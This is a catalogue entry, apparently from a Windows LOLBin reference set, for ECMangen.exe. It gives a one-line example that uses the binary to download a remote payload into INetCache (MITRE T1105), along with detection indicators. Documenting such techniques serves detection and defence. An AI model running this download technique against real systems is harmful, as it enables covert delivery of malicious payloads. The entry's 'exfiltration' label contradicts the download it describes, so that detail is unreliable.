---
id: windows-download-ecmangen
namespace: windows:download:ecmangen
name: ecmangen
description: 'Command-line tool for managing certificates in Microsoft Exchange Server. Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe; C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe; C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- ecmangen
parameters: []
features: []
execution:
  template: ecmangen
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache)
  command: ECMangen.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: URL on a ECMangen command line
- type: ioc
  description: ECMangen making unexpected network connections or DNS requests
install:
- method: choco
  package_name: ecmangen
  commands:
  - choco install ecmangen
---


# ecmangen

ecmangen is a Windows LOLBin. Command-line tool for managing certificates in Microsoft Exchange Server. Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe; C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe; C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe.
